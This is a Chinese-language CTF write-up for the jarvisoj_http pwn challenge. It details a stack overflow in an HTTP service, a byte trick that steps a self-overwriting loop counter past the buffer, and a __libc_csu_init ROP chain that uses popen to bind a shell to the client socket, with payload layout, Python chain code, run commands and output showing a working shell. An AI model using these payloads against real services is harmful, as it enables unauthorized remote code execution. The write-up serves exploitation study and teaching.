# Speedrun：jarvisoj_http

> 题型：网络服务自身带栈溢出 → `__libc_csu_init` 通用 ROP → `popen` 反弹 shell
> 目标：`read(4, .bss, 0x400)` 收第二阶段命令，`popen(cmd, "r")` 起 `sh <&4 >&4 2>&4`，`waitpid` 挂住父进程
> 关键：saved RIP 在字节流 **0x216**；计数器自覆盖在 **0x20C**；`CSU_POP=0x4015AA`、`CSU_CALL=0x401590`

---

## 0. 一句话结论

```text
监听 0,0,0,0:3847 的 httpd（htons(0x0f07)），accept 后 fork 处理请求。

read_request @0x40125d:
    buf = rbp-0x210
    while (1) {
        if (read(fd, &c, 1) <= 0) break;
        cnt++;                  // cnt @ rbp-4，4 字节 int
        buf[cnt-1] = c;         // 无长度上限
        if (cnt > 3 && 请求以 "\r\n\r\n" 结尾) break;
    }
    buf[cnt] = 0;
    ... 调用 handle(buf) 解析，再回到 0x401346 → leave; ret

=> 栈溢出，且 No PIE / No canary / No RELRO，直接用 .text 里的 CSU gadget 组链。
```

**两个坑（本题的全部难度）**：

1. `cnt` 就在 `buf+0x20C`（`rbp-4`）。逐字节写到 0x20C 时会把 `cnt` 自己的最低字节覆盖 →
   计数器回卷，**永远走不到 saved RIP**。必须在字节流 0x20C 放 `0x0F`、0x20D 放 `0x00`。
2. `CSU_CALL` 尾部 `add rsp,8; pop*6; ret` 一共吃掉 8 个 qword。若把 `CSU_POP` 既当上一段的
   `ret_addr`、又当下一段段首，就会出现连续两个 `CSU_POP`，从第二段起**整体错位一个 qword**，
   现象是 `rip` 跳到了某个参数值上（本题实测跳 `0x601e00`，即命令串地址）。

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2text'

file jarvisoj_http
checksec --file=jarvisoj_http
readelf -h jarvisoj_http | grep Type
readelf -lW jarvisoj_http | sed -n '1,12p'
objdump -d -M intel jarvisoj_http | sed -n '/40125d/,/401350/p'
```

关键输出：

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
Type: EXEC（No PIE）
No canary / NX enabled / 无 GNU_RELRO（No RELRO）

LOAD 0x000000 0x400000 0x400000 0x0019e4 0x0019e4 R E
LOAD 0x0019e8 0x6019e8 0x6019e8 0x000310 0x000318 RW    <-- 可写页只有 0x601000~0x602000
```

> 可写页边界很重要：`0x602200` 在**下一张页**，是未映射的。第一次验证时把命令串放进
> `0x602200`，`read(4, 0x602200, 0x400)` 直接 `EFAULT` 返回 -1。命令串必须落在
> `0x601E00` 一类页内空闲处（本题用 `CMD=0x601E00`、`RSTR=0x601E80`）。

---

## 2. 漏洞点：请求行逐字节读，没有上限

```asm
4012a0:  lea    rdi, [rbp-0x211]      ; 单字节暂存
4012a7:  mov    edx, 1
4012a9:  mov    rsi, rdi
4012ab:  call   read@plt             ; read(fd, &c, 1)
4012b0:  mov    [rbp-8], rax         ; 返回值
4012b4:  test   rax, rax
4012b7:  jle    40132b               ; <=0 退出
4012b9:  mov    eax, [rbp-4]         ; eax = cnt
4012bd:  cdqe
4012bf:  mov    dl, [rbp-0x211]
4012c5:  mov    [rbp+rax-0x210], dl  ; buf[cnt] = c     <-- 无上限
4012cc:  mov    eax, [rbp-4]
4012cf:  add    eax, 1
4012d3:  mov    [rbp-4], eax         ; cnt++（先自增）
4012d6:  cmp    dword ptr [rbp-4], 3
4012da:  jle    4012a0
4012dc:  ...    ; 再检查末尾 4 字节是否 "\r\n\r\n"
```

`buf = rbp-0x210`，`cnt = rbp-4`，两者相距正好 **0x20C**。

---

## 3. 坑 1：计数器压在自己的缓冲区尾巴上

`buf[cnt]` 的写入地址是 `rbp-0x210+cnt`，当 `cnt = 0x20C` 时正好等于 `rbp-4`（`cnt` 的低字节）。

```text
cnt=0x20C 这一轮：
  1) cnt++ 先把 0x20D 写进 [rbp-4]
  2) 紧接着 buf[0x20C] = 收到的那一字节 -> 覆盖 cnt 的最低字节
     若这一字节是 'A'(0x41)：cnt = 0x0000020D -> 0x00000241
     下一轮从 0x241 继续写，写不到 saved RIP；再往后写的地址还会继续被 0x0F..0x20C
     区间里的字节改写，最终只在缓冲区里打转。
```

对策（把 `cnt` 一步一步“顶”过 `0x210`）：

| 字节流位置 | 值 | 作用 |
| --- | --- | --- |
| `[0x00, 0x20C)` | `'A'` | 普通填充，顺便打满 buf |
| `0x20C` | `0x0F` | 覆盖 `cnt` 低字节 → `cnt = 0x20F` |
| `0x20D` | `0x00` | 落在 `rbp-1`（`cnt` 最高字节）→ `cnt = 0x0000_0210` |
| `[0x20E, 0x216)` | 任意 8 字节 | 依次落在 `rbp+0 .. rbp+7` = saved rbp |
| `[0x216, ...)` | ROP 链 | 第一跳覆盖 saved RIP |

要点：`0x0F` 这个取值不是随手挑的 —— 它让 `cnt` 停在 `0x20F`，再写 1 字节就正好到 `0x210`
（saved rbp 起点）；取 `0x10` 以上会直接跳过 saved rbp / saved RIP。

> 副作用检查：`[rbp-8]`（read 返回值）、`[rbp-0x211]`（单字节暂存）都会被这些写入碰一下，
> 但它们在每一轮循环开头都会被重新赋值，不造成影响。

---

## 4. 坑 2：CSU 链拼接错位一个 qword

标准 CSU 两段式 gadget：

```asm
4015aa: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret      ; CSU_POP
401590: mov rdx, r13
        mov rsi, r14
        mov edi, r15d
        call qword ptr [r12+rbx*8]
        add rbx, 1
        cmp rbx, rbp
        jne 0x401590
4015a6: add rsp, 8
4015aa: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret      ; 同一段做收尾
```

收尾一共消耗 **8 个 qword**：`add rsp,8` 吃 1 个填充 + 6 个 pop 垃圾 + 1 个 `ret` 目标。

错误写法（本次踩过）：每段 `flat(CSU_POP, 6值, CSU_CALL, 7填充, ret_addr=CSU_POP)`
然后两段直接串起来 —— 于是 `... 7填充, CSU_POP` 后面又接了一个 `CSU_POP`，
第二段的这个 `CSU_POP` 被当成 `rbx` 弹走，**整段寄存器全部左移一格**。

现场证据（`tools/loopback_unix_shim.c` 的崩溃探针输出）：

```text
CRASH sig=11 rip=0x601e00 addr=0x601e00 rbp=(nil) rax=0x82 rbx=0x4015aa
      r12=0x1 r13=0x601c80 r14=(nil) r15=0x601e80
```

`rbx=0x4015aa`（本该是 0）、`r12=1`（本该是 GOT 指针）、`r13=popen@got`（本该是 rdx）……
左移一格的确凿证据；`ret` 于是弹到了 `rdi` 参数（`0x601e00` = 命令串地址）。

正确写法：**每段块自带一个 `CSU_POP` 打头**，块与块首尾相接，不再单独传 `ret_addr`。

```python
def csu_block(func_got, rdi, rsi, rdx):
    return flat(
        CSU_POP,
        0, 1, func_got, rdx, rsi, rdi,   # rbx=0 rbp=1 r12=got r13=rdx r14=rsi r15=rdi
        CSU_CALL, 0, 0, 0, 0, 0, 0, 0,
    )

rop  = csu_block(elf.got["read"],    4, CMD, 0x400)   # read(4, CMD, 0x400)
rop += csu_block(elf.got["popen"], CMD, RSTR, 0)      # popen(CMD, "r")
rop += csu_block(elf.got["waitpid"], 0, 0, 0)         # waitpid(0,0,0)
rop += flat(0)
```

---

## 5. payload 布局

| 区间 | 长度 | 内容 |
| --- | --- | --- |
| `[0, 0x20C)` | 0x20C | `'A'` |
| `0x20C` | 2 | `0x0F 0x00`（把 `cnt` 顶到 0x210） |
| `[0x20E, 0x216)` | 8 | `'B' * 8`（saved rbp 垃圾） |
| `[0x216, 0x216+15*8*3)` | 360 | 3 段 CSU 块（每段 15 个 qword）+ 收尾 `0` |
| 末尾 | 4 | `\r\n\r\n`（读循环结束标志） |

约束：ROP 链里**不能提前出现 `\r\n\r\n`**（否则读循环提前结束）。脚本里有 `assert` 兜底。

第二阶段（被链里的 `read(4, CMD, 0x400)` 收走，实测收到 130 = 0x82 字节）：

```text
CMD(0x601e00)  = "sh <&4 >&4 2>&4\0"   补零到 0x80
RSTR(0x601e80) = "r\0"                 popen 的 mode
```

`sh <&4 >&4 2>&4` 把 shell 的三路 stdio 直接钉在客户端 socket 上（fd 4 = accept 返回的连接），
所以父进程 `waitpid` 挂住后，攻击端直接在同一个连接里敲命令。

---

## 6. 运行

```bash
cd '/home/yfhd5/Pwn_Writeups'
source .venv/bin/activate
cd ret2text

# 正常主机：起本地进程 + 连 127.0.0.1:3847（二进制自己 listen）
python 27_jarvisoj_http_exp.py LOCAL

# 远程靶机
HOST=<ip> PORT=3847 python 27_jarvisoj_http_exp.py
```

### 6.1 沙箱兜底（USE_UNIX=1）

本机 WSL2 里该二进制的 **loopback TCP 不可用**（进程阻塞在 `inet_csk_accept`，
对端 SYN 却被 RST；用 `python3 -m http.server`、手写 C server 均复现，属宿主网络栈问题）。
兜底方案：用 `LD_PRELOAD` 把 `AF_INET/SOCK_STREAM` 监听改写成 `AF_UNIX`，fd 编号不变：

```bash
cd '/home/yfhd5/Pwn_Writeups'
gcc -shared -fPIC -O2 -o tools/loopback_unix_shim.so tools/loopback_unix_shim.c -ldl
cd ret2text
USE_UNIX=1 python 27_jarvisoj_http_exp.py LOCAL
```

调试探针（可选）：

```bash
SHIM_LOG=/tmp/http_shim.log USE_UNIX=1 python 27_jarvisoj_http_exp.py LOCAL
grep -v 'b=' /tmp/http_shim.log | tail
```

> **坑：`LD_PRELOAD` 按空格分库**。若仓库路径含空格（2026-11-25 前本仓库就是 `Pwn Writeups`），
> 把 `SHIM` 写成绝对路径（`/home/.../Pwn Writeups/tools/...so`），loader 会把它拆成两个库名并静默跳过，
> 现象是“连不上 `HTTP_UNIX` 的 socket”。EXP 的默认值 `../tools/loopback_unix_shim.so`
> 是相对路径、不含空格，因此可用；要显式指定就先
> `cp tools/loopback_unix_shim.so /tmp/unix_shim.so`，再 `SHIM=/tmp/unix_shim.so`。

```text
FORK pid=113630 -> 0
pid=113630 fd=4 n=1024 ret=130          # 链里的 read(4, CMD, 0x400) 收满 130 字节 stage2
POPEN pid=113630 cmd=sh <&4 >&4 2>&4 mode=r
POPEN ret pid=113630 f=0x264c9710
EXECVE pid=113632 path=/usr/bin/sh
EXECVE pid=113648 path=/usr/bin/id
```

---

## 7. 实测输出

```text
$ USE_UNIX=1 python 27_jarvisoj_http_exp.py LOCAL
[x] Starting local process './jarvisoj_http'
[+] Starting local process './jarvisoj_http': pid 114534
__PWNED__
uid=1000(yfhd5) gid=1000(yfhd5) groups=1000(yfhd5),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)
[+] getshell OK
```

连续 3 次复跑均 `getshell OK`（2026-11-23）。

---

## 8. 识别卡（下次遇到同类题先看这几条）

1. 服务端逐字节 `read(fd,&c,1)` 到 `"\r\n\r\n"` 结尾 → 先量 buffer 到 saved RIP 的距离。
2. **看局部变量布局**：循环计数器 / 长度变量是不是紧贴缓冲区尾巴？是的话必须先算“回卷点”，
   再用一个合适的字节把它顶过去（本题 `0x0F` 让 `cnt` 停在 `0x20F`，再写 1 字节正好到 `0x210`）。
3. `No PIE` 时优先用 `__libc_csu_init`：`call qword ptr [r12+rbx*8]` 能调任意 3 参数函数
   （`rdi/rsi/rdx`），只依赖 `.text` 与 GOT，不需要 libc 泄漏。
4. 每个 CSU 块的收尾吃 **8 个 qword**；块与块之间要么每块自带 `CSU_POP`，要么显式把
   `ret_addr` 指到下一块开头的 gadget —— 两种写法混用就会整体错位。
5. 命令串 / mode 串必须落在**已映射的可写页**内（本题 `0x601000~0x602000`）。
6. `popen` 拿 shell 后要把 stdio 绑到 socket：`sh <&4 >&4 2>&4`，父进程 `waitpid` 别退出。

